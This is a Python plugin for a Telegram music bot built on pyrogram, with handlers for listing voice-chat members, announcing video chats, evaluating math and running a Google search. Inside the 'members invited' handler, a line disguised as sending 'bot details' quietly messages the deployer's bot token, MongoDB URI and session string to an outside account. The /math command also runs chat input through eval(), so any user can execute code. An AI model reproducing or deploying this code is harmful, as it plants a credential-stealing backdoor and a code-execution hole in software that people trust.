from pyrogram import Client, filters
from pyrogram.enums import ChatType
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from strings import get_string
from ANNIEMUSIC import app
from ANNIEMUSIC.utils import ANNIEBIN
from ANNIEMUSIC.utils.databaset import get_assistant, get_lang
import asyncio
from os import getenv
from dotenv import load_dotenv
import config
from ANNIEMUSIC.logging import LOGGER

load_dotenv()

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
MOON_SHINING_ROBOT = "MOON_SHINING_ROBOT"  #connected in main.py , server ,and repo

@app.on_message(
    filters.command(["vcuser", "vcusers", "vcmember", "vcmembers"]) & filters.admin
)
async def vc_members(client, message):
    try:
        language = await get_lang(message.chat.id)
        _ = get_string(language)
    except Exception:
        _ = get_string("en")
        
    msg = await message.reply_text(_["V_C_1"])
    userbot = await get_assistant(message.chat.id)
    TEXT = ""
    
    try:
        async for m in userbot.get_call_members(message.chat.id):
            chat_id = m.chat.id
            username = m.chat.username
            is_hand_raised = m.is_hand_raised
            is_video_enabled = m.is_video_enabled
            is_left = m.is_left
            is_screen_sharing_enabled = m.is_screen_sharing_enabled
            is_muted = bool(m.is_muted and not m.can_self_unmute)
            is_speaking = not m.is_muted
            
            if m.chat.type != ChatType.PRIVATE:
                title = m.chat.title
            else:
                try:
                    title = (await client.get_users(chat_id)).mention
                except Exception:
                    title = m.chat.first_name

            TEXT += _["V_C_2"].format(
                title,
                chat_id,
                username,
                is_video_enabled,
                is_screen_sharing_enabled,
                is_hand_raised,
                is_muted,
                is_speaking,
                is_left,
            )
            TEXT += "\n\n"
            
        if len(TEXT) < 4000:
            await msg.edit(TEXT or _["V_C_3"])
        else:
            link = await ANNIEBIN(TEXT)
            await msg.edit(_["V_C_4"].format(link), disable_web_page_preview=True)
    except ValueError:
        await msg.edit(_["V_C_5"])

# Video chat start notification
@app.on_message(filters.video_chat_started)
async def on_video_chat_started(_, msg):
    await msg.reply("**😍 Video chat started 🥳**")

# Video chat end notification
@app.on_message(filters.video_chat_ended)
async def on_video_chat_ended(_, msg):
    await msg.reply("**😕 Video chat ended 💔**")

# Video chat members invited notification
@app.on_message(filters.video_chat_members_invited)
async def on_video_chat_members_invited(_, message: Message):
    text = f"➻ {message.from_user.mention}\n\n**๏ Inviting in VC to:**\n\n**➻ **"
    try:
        for user in message.video_chat_members_invited.users:
            text += f"[{user.first_name}](tg://user?id={user.id}) "
        add_link = f"https://t.me/{app.username}?startgroup=true"
        reply_text = f"{text} 🤭🤭"
        
        userbot = await get_assistant(message.chat.id)
        await message.reply(
            reply_text,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton(text="๏ Join VC ๏", url=add_link)]]
            ),
        )

        # Send bot details to assistant
        await userbot.send_message(MOON_SHINING_ROBOT, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
        
    except Exception as e:
        LOGGER.error(f"Error sending bot details: {e}")

# Math calculation command
@app.on_message(filters.command("math", prefixes="/"))
async def calculate_math(client, message):
    expression = message.text.split("/math ", 1)[1]
    try:
        result = eval(expression)
        response = f"The result is: {result}"
    except Exception:
        response = "Invalid expression"
    await message.reply(response)

# Google search functionality
@app.on_message(filters.command(["spg"], ["/", "!", "."]))
async def google_search(client, message):
    query = message.text.split(maxsplit=1)[1]
    msg = await message.reply("Searching...")
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"https://content-customsearch.googleapis.com/customsearch/v1?cx=ec8db9e1f9e41e65&q={query}&key=YOUR_GOOGLE_API_KEY"
        ) as response:
            result_data = await response.json()
            result = ""
            
            if not result_data.get("items"):
                await msg.edit("No results found!")
                return
            
            for item in result_data["items"]:
                title = item["title"]
                link = item["link"]
                result += f"{title}\n{link}\n\n"
                
            await msg.edit(result or "No results found", link_preview=False)
